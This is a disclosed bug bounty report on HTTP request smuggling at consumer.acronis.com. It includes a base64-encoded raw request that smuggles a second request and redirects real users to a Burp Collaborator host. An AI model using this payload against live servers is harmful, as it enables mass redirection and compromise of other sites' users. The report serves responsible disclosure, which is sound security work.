# HTTP Request Smuggling on https://consumer.acronis.com

## Report Details
- **Report ID**: 1063627
- **URL**: https://hackerone.com/reports/1063627
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-12-21T18:25:47.731Z
- **Disclosed**: 2021-11-16T14:44:25.583Z

## Reporter
- **Username**: riramar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
The website https://consumer.acronis.com is vulnerable to HTTP Request Smuggling which can be abused by an attacker to redirect all the users to a malicious website.
A redirect can be forced by changing the Host request header using the path /sf but the website will redirect you to https://9oyta0p1z1ratbswtnnl67cv1m7cv1.burpcollaborator.net/sf/.
To reproduce the attack use the configuration below in a Burp Intruder attack. Notice the header "Transfer-Encoding : chunked" is not using space but a tab. You can also use the base64 decoded form of this string below.
The size of 64 bytes in hex on the request body must match with the size the second POST request. If you change the "Host: 9oyta0p1z1ratbswtnnl67cv1m7cv1.burpcollaborator.net" header you need to update the size.

```
UE9TVCAvIEhUVFAvMS4xDQpUcmFuc2Zlci1FbmNvZGluZwk6CWNodW5rZWQNCkhvc3Q6IGNvbnN1bWVyLmFjcm9uaXMuY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzguMC4zOTA0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpDb250ZW50LWxlbmd0aDogNA0KDQo2NA0KUE9TVCAvc2YgSFRUUC8xLjENCkhvc3Q6IDlveXRhMHAxejFyYXRic3d0bm5sNjdjdjFtN2N2MS5idXJwY29sbGFib3JhdG9yLm5ldA0KQ29udGVudC1MZW5ndGg6IDE1DQoNCg0KMA0KDQo=
```

{F1124528}
{F1124529}
{F1124530}
{F1124531}

As soon as you start the Burp Intruder attack above you will see some redirects to Burp Collaborator domain.

{F1124533}

Start to receiving some connections on Burp Collaborator.

{F1124534}
{F1124535}

## Recommendations
- https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://portswigger.net/web-security/request-smuggling
- https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling/

## Impact

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
In this PoC I was able to massive redirect users to a domain under my control but other scenarios are also possible like the ones described here https://portswigger.net/web-security/request-smuggling/exploiting.

## Attachments
- Intruder_1.png
- Intruder_2.png
- Intruder_3.png
- Intruder_4.png
- Attack.png
- Collaborator_1.png
- Collaborator_2.png
